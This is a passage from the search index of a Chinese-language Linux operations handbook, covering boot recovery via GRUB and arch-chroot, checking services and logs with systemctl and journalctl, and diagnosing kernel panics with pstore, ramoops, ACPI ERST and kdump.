<li>\u200b\u5185\u6838\u200b\u8f83\u200b\u65b0\u200b\uff0c\u200b\u5bf9\u200b\u8f83\u200b\u65b0\u200b\u7684\u200b\u786c\u4ef6\u200b\u652f\u6301\u200b\u8f83\u200b\u597d\u200b</li> <li>\u200b\u5360\u7528\u200b\u7a7a\u95f4\u200b\u5c0f\u200b</li> <li><code>arch-chroot</code> \u200b\u5de5\u5177\u200b\u53ef\u4ee5\u200b\u65b9\u4fbf\u200b\u5730\u200b chroot \u200b\u5230\u200b\u5b89\u88c5\u200b\u7684\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u6267\u884c\u200b\u64cd\u4f5c\u200b<ul> <li>\u200b\u5982\u679c\u200b\u4e0d\u200b\u4f7f\u7528\u200b <code>arch-chroot</code>\uff0c\u200b\u5728\u200b chroot \u200b\u8fdb\u5165\u200b\u7cfb\u7edf\u200b\u524d\u200b\u5c31\u200b\u9700\u8981\u200b\u624b\u52a8\u200b\u6302\u8f7d\u200b <code>/proc</code>\u3001<code>/sys</code>\u3001<code>/dev</code> \u200b\u7b49\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3001\u200b\u914d\u7f6e\u200b <code>/etc/resolv.conf</code> \u200b\u7b49\u7b49\u200b\uff0c\u200b\u6bd4\u8f83\u200b\u9ebb\u70e6\u200b\u3002</li> </ul> </li> </ul> <p>\u200b\u5982\u679c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b GRUB \u200b\u754c\u9762\u200b\uff0c\u200b\u4f46\u662f\u200b\u53d1\u73b0\u200b\u8fdb\u5165\u200b\u7cfb\u7edf\u200b\u65f6\u200b\u5361\u6b7b\u200b\u4e14\u200b\u6ca1\u6709\u200b\u8be6\u7ec6\u200b\u7684\u200b\u9519\u8bef\u4fe1\u606f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9700\u8981\u200b\u5728\u200b GRUB \u200b\u754c\u9762\u200b\u4e2d\u200b\u6309\u200b\u4e0b\u200b <code>e</code> \u200b\u952e\u200b\uff0c\u200b\u7f16\u8f91\u200b\u5bf9\u5e94\u200b\u7684\u200b\u542f\u52a8\u9879\u200b\uff0c\u200b\u5220\u9664\u200b <code>linux</code> \u200b\u8fd9\u200b\u4e00\u884c\u200b\u7684\u200b <code>quiet</code> \u200b\u548c\u200b <code>splash</code> \u200b\u9009\u9879\u200b\u3002\u200b\u53d1\u884c\u7248\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u9ed8\u8ba4\u200b\u5305\u542b\u200b\u8fd9\u4e9b\u200b\u9009\u9879\u200b\uff0c\u200b\u4ee5\u200b\u51cf\u5c0f\u200b\u542f\u52a8\u200b\u65f6\u200b\u7684\u200b\u8f93\u51fa\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u663e\u793a\u200b\u6f02\u4eae\u200b\u7684\u200b\u542f\u52a8\u200b\u52a8\u753b\u200b\uff08\u200b\u5982\u679c\u200b\u6709\u200b\uff09\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u4f1a\u200b\u5f71\u54cd\u200b\u5230\u200b\u95ee\u9898\u200b\u8c03\u8bd5\u200b\u3002</p> <p>\u200b\u8bf8\u5982\u200b Debian \u200b\u7b49\u200b\u53d1\u884c\u7248\u200b\u4f1a\u200b\u989d\u5916\u200b\u751f\u6210\u200b recovery \u200b\u7684\u200b\u542f\u52a8\u9879\u200b\uff0c\u200b\u4f1a\u200b\u914d\u7f6e\u200b\u8fdb\u5165\u200b\u5355\u7528\u6237\u200b\u6a21\u5f0f\u200b\uff08single user mode\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u5c1d\u8bd5\u200b\u4f7f\u7528\u200b\u8fd9\u4e2a\u200b\u9009\u9879\u200b\u8fdb\u5165\u200b\u7cfb\u7edf\u200b\u3002</p>"},{"location":"ops/debug/#status-and-logs","title":"\u670d\u52a1\u200b\u72b6\u6001\u200b\u4e0e\u200b\u65e5\u5fd7","text":""},{"location":"ops/debug/#logs-intro","title":"\u65e5\u5fd7\u200b\u7b80\u4ecb","text":"<p>\u200b\u5f53\u200b\u51fa\u73b0\u5f02\u5e38\u200b\uff0c\u200b\u767b\u5f55\u200b\u7cfb\u7edf\u200b\u540e\u200b\uff0c\u200b\u7b2c\u4e00\u4ef6\u200b\u4e8b\u60c5\u200b\u53ef\u80fd\u200b\u662f\u200b\u68c0\u67e5\u200b\u5f53\u524d\u200b\u7cfb\u7edf\u200b\u7684\u200b\u670d\u52a1\u200b\u72b6\u6001\u200b\u3002 <code>systemctl --failed</code> \u200b\u53ef\u4ee5\u200b\u5217\u51fa\u200b\u5f53\u524d\u200b\u5931\u8d25\u200b\u7684\u200b\u670d\u52a1\u200b\u3002 \u200b\u5982\u679c\u200b\u663e\u793a\u200b\u5927\u91cf\u200b\u670d\u52a1\u200b\u5931\u8d25\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8bf4\u660e\u200b\u53ef\u80fd\u200b\u9047\u5230\u200b\u4e86\u200b\u6bd4\u8f83\u4e25\u91cd\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f8b\u5982\u200b\u78c1\u76d8\u200b\u5df2\u6ee1\u200b\u7b49\u200b\u3002 \u200b\u53ef\u4ee5\u200b\u5148\u200b\u5c1d\u8bd5\u200b\u5c06\u200b\u5931\u8d25\u200b\u7684\u200b\u670d\u52a1\u200b\u6062\u590d\u200b\u3002<code>systemctl status</code> \u200b\u53ef\u4ee5\u200b\u5217\u51fa\u200b\u5f53\u524d\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u7684\u200b cgroup \u200b\u60c5\u51b5\u200b\uff08\u200b\u7ea6\u7b49\u4e8e\u200b\u6240\u6709\u200b\u6b63\u5728\u200b\u8fd0\u884c\u200b\u7684\u200b\u670d\u52a1\u200b\u4ee5\u53ca\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u6811\u200b\uff09\u3002</p> <p>\u200b\u68c0\u67e5\u200b\u65e5\u5fd7\u200b\u5185\u5bb9\u200b\u4e5f\u200b\u662f\u200b\u68c0\u67e5\u200b\u3001\u200b\u6392\u9664\u200b\u95ee\u9898\u200b\u7684\u200b\u91cd\u8981\u200b\u6b65\u9aa4\u200b\u3002 \u200b\u73b0\u4ee3\u200b\u57fa\u4e8e\u200b systemd \u200b\u7684\u200b Linux \u200b\u7cfb\u7edf\u200b\u7684\u200b\u65e5\u5fd7\u200b\u901a\u5e38\u200b\u7531\u200b systemd-journald \u200b\u8d1f\u8d23\u7ba1\u7406\u200b\u3002 \u200b\u4ee5\u4e0b\u200b\u662f\u200b\u5e38\u7528\u200b\u7684\u200b\u547d\u4ee4\u200b\uff1a</p> <ul> <li><code>journalctl -b</code>: \u200b\u67e5\u770b\u200b\u672c\u6b21\u200b\u5f00\u673a\u200b\u7684\u200b\u65e5\u5fd7\u200b\u3002\u200b\u5728\u200b <code>-b</code> \u200b\u540e\u200b\u52a0\u4e0a\u200b <code>-1</code>/<code>-2</code> \u200b\u7b49\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u4e0a\u6b21\u200b/\u200b\u4e0a\u200b\u4e0a\u6b21\u200b\u7b49\u200b\u7684\u200b\u5f00\u673a\u200b\u65e5\u5fd7\u200b\u3002</li> <li><code>journalctl --since \"1 hour ago\"</code>: \u200b\u67e5\u770b\u200b\u6700\u8fd1\u200b\u4e00\u200b\u5c0f\u65f6\u200b\u7684\u200b\u65e5\u5fd7\u200b\u3002</li> <li><code>journalctl -u xxx.service</code>: \u200b\u67e5\u770b\u200b\u67d0\u4e2a\u200b\u670d\u52a1\u200b\u7684\u200b\u65e5\u5fd7\u200b\u3002</li> <li><code>journalctl -f</code>: \u200b\u5b9e\u65f6\u200b\u67e5\u770b\u200b\u65e5\u5fd7\u200b\u3002</li> <li><code>journalctl -b -k</code>: \u200b\u67e5\u770b\u200b\u672c\u6b21\u200b\u542f\u52a8\u200b\u7684\u200b\u5185\u6838\u200b\u6001\u200b\u65e5\u5fd7\u200b\u3002   <code>dmesg</code> \u200b\u7684\u200b\u547d\u4ee4\u200b\u867d\u7136\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\uff0c\u200b\u4f46\u662f\u200b\u56e0\u4e3a\u200b\u5185\u6838\u200b\u5185\u5b58\u200b\u6709\u9650\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53ef\u80fd\u200b\u770b\u4e0d\u5230\u200b\u8f83\u200b\u65e9\u200b\u7684\u200b\u5185\u6838\u200b\u6001\u200b\u65e5\u5fd7\u200b\u4fe1\u606f\u200b\u3002   journald \u200b\u4f1a\u5e2e\u200b\u6211\u4eec\u200b\u6301\u4e45\u200b\u5316\u200b\u5185\u6838\u200b\u6001\u200b\u65e5\u5fd7\u200b\u4fe1\u606f\u200b\u3002</li> </ul> <p>journalctl \u200b\u9ed8\u8ba4\u200b\u4f1a\u200b\u4f7f\u7528\u200b pager\uff08\u200b\u6362\u53e5\u8bdd\u8bf4\u200b\uff0c<code>less</code>\uff09\u200b\u663e\u793a\u200b\u65e5\u5fd7\u200b\uff0c\u200b\u5f53\u7136\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u540e\u9762\u200b\u63a5\u4e2a\u200b <code>| grep ...</code> \u200b\u6765\u200b\u8fc7\u6ee4\u200b\u65e5\u5fd7\u200b\u3002 \u200b\u6b64\u5916\u200b\uff0c\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b\u4e86\u200b\u7528\u6237\u670d\u52a1\u200b\uff08user service\uff09\uff0c\u200b\u90a3\u4e48\u200b\u68c0\u67e5\u7528\u6237\u200b\u670d\u52a1\u200b\u7684\u200b\u72b6\u6001\u200b\u6216\u8005\u200b\u65e5\u5fd7\u200b\u65f6\u200b\uff0c\u200b\u9700\u8981\u200b\u52a0\u4e0a\u200b <code>--user</code> \u200b\u53c2\u6570\u200b\u3002</p> <p>@taoky: journald \u200b\u7684\u200b\u4e00\u70b9\u200b\u5410\u69fd\u200b</p> <p>\u200b\u9996\u5148\u200b\u2026\u2026journald \u200b\u770b\u200b\u65e5\u5fd7\u200b\u592a\u6162\u200b\u4e86\u200b\uff0c\u200b\u65e5\u5fd7\u200b\u5f88\u591a\u200b\u7684\u8bdd\u200b\u5b9e\u5728\u200b\u662f\u200b\u6162\u200b\u3002 \u200b\u800c\u4e14\u200b <code>systemctl status xxx.service</code> \u200b\u56e0\u4e3a\u200b\u8981\u200b\u663e\u793a\u200b\u6700\u8fd1\u200b\u51e0\u6761\u200b\u65e5\u5fd7\u200b\uff0c \u200b\u4e5f\u200b\u8ddf\u7740\u200b\u6162\u200b\u2014\u2014\u200b\u5728\u200b mirrors \u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u751a\u81f3\u200b\u8981\u200b\u4e00\u5206\u200b\u591a\u200b\u949f\u200b\u624d\u80fd\u200b\u663e\u793a\u200b\u51fa\u200b\u670d\u52a1\u200b\u72b6\u6001\u200b\u3002 \u200b\u5173\u4e8e\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9605\u8bfb\u200b\u4ee5\u4e0b\u200b\u8ba8\u8bba\u200b:</p> <ul> <li>https://github.com/systemd/systemd/issues/2460</li> <li>https://github.com/systemd/systemd/pull/29261</li> <li>https://github.com/systemd/systemd/pull/30209</li> </ul> <p>\u200b\u7136\u540e\u200b\uff0cjournald \u200b\u8bbe\u7f6e\u200b\u6309\u7167\u200b\u65f6\u95f4\u200b\u7684\u200b retention \u200b\u4e5f\u200b\u4e0d\u200b\u592a\u200b\u65b9\u4fbf\u200b\u3002 \u200b\u6bd4\u5982\u8bf4\u200b\uff0c\u200b\u5982\u679c\u200b\u60f3\u200b\u4fdd\u7559\u200b 180 \u200b\u5929\u200b\u7684\u200b\u65e5\u5fd7\u200b\u7684\u8bdd\u200b\uff0c\u200b\u600e\u4e48\u200b\u8bbe\u7f6e\u200b journald \u200b\u5462\u200b\uff1f <code>MaxRetentionSec</code> \u200b\u4f3c\u4e4e\u200b\u4e0d\u591f\u200b\u2026\u2026</p> <p>\u200b\u6700\u540e\u200b\u4e00\u70b9\u200b\u662f\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u5b9e\u65f6\u200b\u770b\u200b\u5185\u6838\u200b\u6001\u200b\u65e5\u5fd7\u200b\uff0c\u200b\u6211\u200b\u66f4\u200b\u63a8\u8350\u200b\u7528\u200b <code>dmesg -w</code>\uff0c\u200b\u56e0\u4e3a\u200b\u989c\u8272\u200b\u66f4\u597d\u200b\u770b\u200b\u4e00\u4e9b\u200b\u3002</p> <p>\u200b\u5927\u90e8\u5206\u200b\u7684\u200b Debian \u200b\u7cfb\u7edf\u200b\u4f1a\u200b\u9884\u88c5\u200b rsyslog\uff0c\u200b\u5b83\u4f1a\u200b\u5c06\u200b journald \u200b\u7684\u200b\u65e5\u5fd7\u200b\u8f6c\u53d1\u200b\u5230\u200b <code>/var/log/syslog</code>\uff0c\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u5e38\u89c4\u200b\u7684\u200b\u547d\u4ee4\u884c\u200b\u6587\u672c\u5904\u7406\u200b\u5de5\u5177\u200b\u5206\u6790\u200b\u3002 \u200b\u5176\u4ed6\u200b\u4e00\u4e9b\u200b\u8f6f\u4ef6\u200b\u53ef\u80fd\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u4f7f\u7528\u200b journald\uff0c\u200b\u800c\u662f\u200b\u76f4\u63a5\u200b\u5c06\u200b\u65e5\u5fd7\u200b\u5199\u5165\u200b\u5230\u200b <code>/var/log/</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u7684\u200b\u6587\u4ef6\u200b\u4e2d\u200b\uff0c\u200b\u4f8b\u5982\u200b nginx\u3002</p> <p>logrotate \u200b\u4f1a\u200b\u5b9a\u671f\u200b\uff08\u200b\u4e00\u822c\u200b\u662f\u200b\u6bcf\u5929\u200b\uff0c\u200b\u6216\u8005\u200b\u6587\u4ef6\u200b\u8db3\u591f\u200b\u5927\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8bf7\u200b\u53c2\u8003\u200b <code>/etc/logrotate*</code> \u200b\u5bf9\u5e94\u200b\u7684\u200b\u914d\u7f6e\u200b\uff09\u300c\u200b\u8f6e\u8f6c\u200b\u300d\uff08rotate\uff09\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\uff1a \u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b\u5c06\u200b\u65e7\u200b\u65e5\u5fd7\u200b\u538b\u7f29\u200b\uff0c\u200b\u66f4\u65e7\u200b\u7684\u200b\u65e5\u5fd7\u200b\u5220\u9664\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u3002\u200b\u4e3a\u4e86\u200b\u5206\u6790\u200b\u88ab\u200b\u538b\u7f29\u200b\u8fc7\u200b\u7684\u200b\u5386\u53f2\u200b\u65e5\u5fd7\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u5bf9\u5e94\u200b\u538b\u7f29\u8f6f\u4ef6\u200b\u63d0\u4f9b\u200b\u7684\u200b\u5de5\u5177\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>gz</code> \u200b\u683c\u5f0f\u200b\u5bf9\u5e94\u200b <code>zcat</code>/<code>zgrep</code>\uff0c<code>xz</code> \u200b\u683c\u5f0f\u200b\u5bf9\u5e94\u200b <code>xzcat</code>/<code>xzgrep</code>\uff0c<code>zst</code> \u200b\u683c\u5f0f\u200b\u5bf9\u5e94\u200b <code>zstdcat</code>/<code>zstdgrep</code> \u200b\u7b49\u7b49\u200b\u3002</p> <p>\u200b\u67d0\u6bb5\u200b\u65e5\u5fd7\u200b/\u200b\u9519\u8bef\u4fe1\u606f\u200b\u662f\u4ece\u200b\u54ea\u4e2a\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u6e90\u4ee3\u7801\u200b\u4e2d\u200b\u7684\u200b\u54ea\u91cc\u200b\u8f93\u51fa\u200b\u7684\u200b\uff1f</p> <p>\u200b\u5728\u200b\u6392\u67e5\u200b\u95ee\u9898\u200b\u65f6\u200b\uff0c\u200b\u6709\u65f6\u5019\u200b\u4f1a\u200b\u9700\u8981\u200b\u53bb\u200b\u641e\u6e05\u695a\u200b\u662f\u200b\u4ec0\u4e48\u200b\u4e1c\u897f\u200b\u5728\u200b\u54ea\u91cc\u200b\u8f93\u51fa\u200b\u4e86\u200b\u6211\u4eec\u200b\u770b\u5230\u200b\u7684\u200b\u9519\u8bef\u4fe1\u606f\u200b\u3002\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4f7f\u7528\u200b\u4ee3\u7801\u200b\u641c\u7d22\u200b\u7f51\u7ad9\u200b\uff0c\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u9009\u62e9\u200b\u6709\u200b\uff1a</p> <ul> <li>GitHub \u200b\u4ee3\u7801\u200b\u641c\u7d22\u200b\uff08\u200b\u9700\u8981\u200b\u767b\u5f55\u200b\uff09\uff0c\u200b\u76f4\u63a5\u200b\u5728\u200b\u641c\u7d22\u200b\u6846\u200b\u8f93\u5165\u200b\u5373\u53ef\u200b\u3002</li> <li>Debian Code Search\uff0c\u200b\u53ef\u4ee5\u200b\u641c\u7d22\u200b Debian \u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u6240\u6709\u200b\u5305\u200b\u7684\u200b\u6e90\u4ee3\u7801\u200b\u3002</li> </ul> <p>\u200b\u67d0\u4e9b\u200b\u5927\u578b\u200b\u7a0b\u5e8f\u200b\u4e5f\u200b\u6709\u200b\u4e13\u95e8\u200b\u7684\u200b\u641c\u7d22\u200b\u7f51\u7ad9\u200b\uff0c\u200b\u4f8b\u5982\u200b Chromium Code Search\u3002</p>"},{"location":"ops/debug/#kernel-panic-and-pstore","title":"Kernel panic \u200b\u4e0e\u200b pstore","text":"<p>\u200b\u5f53\u200b\u5185\u6838\u200b\u9047\u5230\u200b\u4e0d\u53ef\u200b\u6062\u590d\u200b\u7684\u200b\u81f4\u547d\u200b\u9519\u8bef\u200b\u65f6\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u53d1\u751f\u200b\u300c\u200b\u5185\u6838\u200b\u6050\u614c\u200b\u300d\uff0c\u200b\u5373\u200b kernel panic\uff0c\u200b\u8868\u793a\u200b\u5185\u6838\u200b\u5d29\u6e83\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u7ee7\u7eed\u200b\u64cd\u4f5c\u200b\u3002 \u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0ckernel panic \u200b\u7684\u200b\u65f6\u5019\u200b\u4f1a\u200b\u6253\u5370\u200b\u51fa\u200b\u62a5\u9519\u200b\u4fe1\u606f\u200b\uff0c\u200b\u7136\u540e\u200b\u9700\u8981\u200b\u4eba\u5de5\u200b\u91cd\u542f\u200b\u3002 \u200b\u7136\u800c\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u5b9e\u9a8c\u5ba4\u200b\u70bc\u4e39\u200b\u7089\u200b\u6216\u8005\u200b\u4e0d\u6613\u200b\u8fdc\u7a0b\u200b\u64cd\u4f5c\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u7b49\u200b\u4e00\u4e9b\u200b\u573a\u666f\u200b\u6765\u8bf4\u200b\uff0c\u200b\u7ba1\u7406\u5458\u200b\u53ef\u80fd\u200b\u66f4\u200b\u5e0c\u671b\u200b\u670d\u52a1\u200b\u80fd\u591f\u200b\u5c3d\u5feb\u6062\u590d\u200b\uff0c\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u8bbe\u7f6e\u200b <code>kernel.panic</code> \u200b\u8fd9\u200b\u4e00\u9879\u200b sysctl \u200b\u53c2\u6570\u200b\u5b9e\u73b0\u200b\u5728\u200b panic \u200b\u65f6\u200b\u7684\u200b\u81ea\u52a8\u200b\u91cd\u542f\u200b\uff0c\u200b\u4f46\u200b\u8fd9\u200b\u4e5f\u200b\u4f7f\u5f97\u200b\u7ba1\u7406\u5458\u200b\u65e0\u6cd5\u200b\u53ca\u65f6\u200b\u5730\u200b\u5728\u200b\u7ec8\u7aef\u200b\u4e0a\u200b\u770b\u5230\u200b\u91cd\u542f\u200b\u524d\u200b\u6700\u540e\u200b\u7684\u200b panic \u200b\u4fe1\u606f\u200b\u3002</p> <p>pstore\uff08Persistent Storage\uff09\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5185\u6838\u200b\u7279\u6027\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5728\u200b\u7cfb\u7edf\u200b\u5d29\u6e83\u200b\u65f6\u200b\u4fdd\u5b58\u200b\u62a5\u9519\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4ee5\u4f9b\u200b\u540e\u7eed\u200b\u5206\u6790\u200b\u3002 pstore \u200b\u652f\u6301\u200b\u591a\u79cd\u200b\u5b58\u50a8\u200b\u540e\u200b\u7aef\u200b\uff0c\u200b\u5305\u62ec\u200b\u4e00\u5c0f\u200b\u6bb5\u200b\u4e13\u95e8\u200b\u5212\u5206\u200b\u7684\u200b\u5185\u5b58\u200b\u533a\u57df\u200b\uff08\u200b\u79f0\u4e3a\u200b ramoops\uff09\u3001ACPI ERST \u200b\u8868\u200b\u4ee5\u53ca\u200b UEFI \u200b\u53d8\u91cf\u200b\u5b58\u50a8\u200b\u533a\u57df\u200b\u7b49\u200b\u3002 \u200b\u5b58\u50a8\u200b\u540e\u200b\u7aef\u200b\u901a\u5e38\u200b\u80fd\u591f\u200b\u63d0\u4f9b\u200b\u81f3\u5c11\u200b 64 KiB \u200b\u7684\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\uff0c\u200b\u8db3\u591f\u200b\u4fdd\u5b58\u200b\u6570\u767e\u200b\u884c\u200b dmesg\uff08\u200b\u9ed8\u8ba4\u200b\u4fdd\u7559\u200b\u6700\u540e\u200b 10 KiB\uff09\u200b\u53ca\u5176\u200b\u4ed6\u200b\u72b6\u6001\u200b\u4fe1\u606f\u200b\u3002 \u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cLinux \u200b\u4f1a\u200b\u5728\u200b <code>/sys/fs/pstore</code> \u200b\u7684\u200b\u4f4d\u7f6e\u200b\u6302\u8f7d\u200b pstore \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u7ba1\u7406\u5458\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u6b64\u200b\u76ee\u5f55\u200b\u67e5\u770b\u200b pstore \u200b\u4e2d\u200b\u5b58\u50a8\u200b\u7684\u200b\u65e5\u5fd7\u200b\u3002 pstore \u200b\u6a21\u5757\u200b\u672c\u8eab\u200b\u7684\u200b\u53c2\u6570\u200b\u4e5f\u200b\u901a\u8fc7\u200b sysfs \u200b\u66b4\u9732\u200b\uff0c\u200b\u4f8b\u5982\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>/sys/module/pstore/parameters/backend</code> \u200b\u7684\u200b\u5185\u5bb9\u200b\u786e\u8ba4\u200b\u5f53\u524d\u200b pstore \u200b\u9009\u7528\u200b\u7684\u200b\u5b58\u50a8\u200b\u540e\u200b\u7aef\u200b\u3002</p> <p>ACPI ERST</p> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u9a8c\u8bc1\u200b\u786c\u4ef6\u200b\u662f\u5426\u200b\u652f\u6301\u200b ACPI ERST\uff1a</p> <pre><code>ls /sys/firmware/acpi/tables/ | grep ERST\n</code></pre> <p>UEFI \u200b\u53d8\u91cf\u200b\u5b58\u50a8\u200b\u53ef\u80fd\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u9ed8\u8ba4\u200b\u542f\u7528\u200b</p> <p>UEFI \u200b\u53d8\u91cf\u200b\u5b58\u50a8\u200b\u533a\u57df\u200b\u7684\u200b\u7a7a\u95f4\u200b\u662f\u200b\u6709\u9650\u200b\u7684\u200b\uff0c\u200b\u5e76\u4e14\u200b\u975e\u5e38\u200b\u4e0d\u5e78\u200b\u7684\u200b\u662f\u200b\uff0cUEFI \u200b\u56fa\u4ef6\u200b\u7684\u200b\u7f16\u5199\u8005\u200b\u4e0d\u5c11\u200b\u90fd\u200b\u6ca1\u6709\u200b\u6070\u5f53\u200b\u5904\u7406\u200b\u53d8\u91cf\u200b\u5b58\u50a8\u200b\u533a\u57df\u200b\u88ab\u200b\u5199\u200b\u6ee1\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002\u200b\u8fd9\u200b\u610f\u5473\u7740\u200b\uff0c\u200b\u4e00\u65e6\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\u53d1\u751f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u7cfb\u7edf\u200b\u5c31\u200b\u53ef\u80fd\u200b\u53d8\u7816\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u542f\u52a8\u200b\u3002\u200b\u56e0\u6b64\u200b\u5185\u6838\u200b\u63d0\u4f9b\u200b\u4e86\u200b <code>CONFIG_EFI_VARS_PSTORE_DEFAULT_DISABLE</code> \u200b\u9009\u9879\u200b\uff0c\u200b\u5982\u679c\u200b\u5b83\u200b\u88ab\u200b\u542f\u7528\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5185\u6838\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u9ed8\u8ba4\u200b\u4f7f\u7528\u200b UEFI \u200b\u53d8\u91cf\u200b\u5b58\u50a8\u200b\u533a\u57df\u200b\u4f5c\u4e3a\u200b pstore \u200b\u7684\u200b\u5b58\u50a8\u200b\u540e\u200b\u7aef\u200b\u3002</p> <p>\u200b\u89c6\u200b\u5185\u6838\u200b\u4e0e\u200b\u53d1\u884c\u7248\u200b\u914d\u7f6e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>zcat /proc/config.gz | grep PSTORE</code> \u200b\u6216\u200b <code>cat /boot/config-$(uname -r) | grep PSTORE</code> \u200b\u6765\u200b\u68c0\u67e5\u200b\u5f53\u524d\u200b\u5185\u6838\u200b\u662f\u5426\u200b\u542f\u7528\u200b\u4e86\u200b pstore \u200b\u4ee5\u53ca\u200b\u76f8\u5173\u200b\u914d\u7f6e\u200b\u60c5\u51b5\u200b\u3002</p> <p>ramoops \u200b\u80fd\u591f\u200b\u4fdd\u7559\u200b\u6570\u636e\u200b\u5417\u200b\uff1f</p> <p>pstore \u200b\u7684\u200b ramoops \u200b\u540e\u200b\u7aef\u200b\u65e0\u6cd5\u200b\u7a81\u7834\u200b\u7269\u7406\u200b\u89c4\u5f8b\u200b\u2014\u2014\u200b\u5982\u679c\u200b\u673a\u5668\u200b\u65ad\u7535\u200b\u91cd\u542f\u200b\u4e86\u200b\uff0c\u200b\u90a3\u4e48\u200b\uff08\u200b\u6613\u200b\u5931\u6027\u200b\uff09\u200b\u5185\u5b58\u200b\u91cc\u200b\u7684\u200b\u6570\u636e\u200b\u5c31\u200b\u81ea\u7136\u200b\u6ca1\u200b\u4e86\u200b\u3002\u200b\u5728\u200b\u4e0d\u65ad\u200b\u7535\u200b\u91cd\u542f\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u5185\u5b58\u200b\u662f\u5426\u200b\u4f1a\u200b\u88ab\u200b\u6e05\u7a7a\u200b\u53d6\u51b3\u4e8e\u200b\u786c\u4ef6\u200b\u5b9e\u73b0\u200b\u3002</p> <p>kdump</p> <p>\u200b\u5982\u679c\u200b\u65e0\u6cd5\u200b\u4f7f\u7528\u200b pstore\uff0ckdump \u200b\u673a\u5236\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f5c\u4e3a\u200b\u66ff\u4ee3\u200b\u65b9\u6848\u200b\u3002kdump \u200b\u9700\u8981\u200b\u5728\u200b\u542f\u52a8\u200b\u65f6\u200b\u5360\u7528\u200b\u4e00\u5757\u200b\u5185\u5b58\u7a7a\u95f4\u200b\u5b58\u50a8\u200b\u5907\u7528\u200b\u5185\u6838\u200b\u7b49\u200b\u4fe1\u606f\u200b\u3002\u200b\u5728\u200b kernel panic \u200b\u65f6\u200b\uff0ckernel \u200b\u4f1a\u200b kexec \u200b\u5230\u200b\u5907\u7528\u200b\u5185\u6838\u200b\u4e0a\u200b\uff0c\u200b\u5907\u7528\u200b\u5185\u6838\u200b\u6b64\u65f6\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u83b7\u53d6\u200b\u5230\u200b\u5185\u6838\u200b\u7684\u200b coredump\u3001dmesg \u200b\u7b49\u200b\u4fe1\u606f\u200b\u3002Debian \u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4e0a\u6587\u200b\u63d0\u5230\u200b\u7684\u200b <code>kdump-tools</code> \u200b\u5305\u6765\u200b\u914d\u7f6e\u200b kdump\u3002</p> <p>\u200b\u7136\u800c\u200b\uff0cpstore \u200b\u7684\u200b\u5bb9\u91cf\u200b\u662f\u200b\u6709\u9650\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b systemd-pstore \u200b\u670d\u52a1\u200b\u4f1a\u200b\u5728\u200b\u542f\u52a8\u200b\u65f6\u200b\u81ea\u52a8\u200b\u5c06\u200b pstore \u200b\u7684\u200b\u5185\u5bb9\u200b\u5f52\u6863\u200b\u81f3\u200b 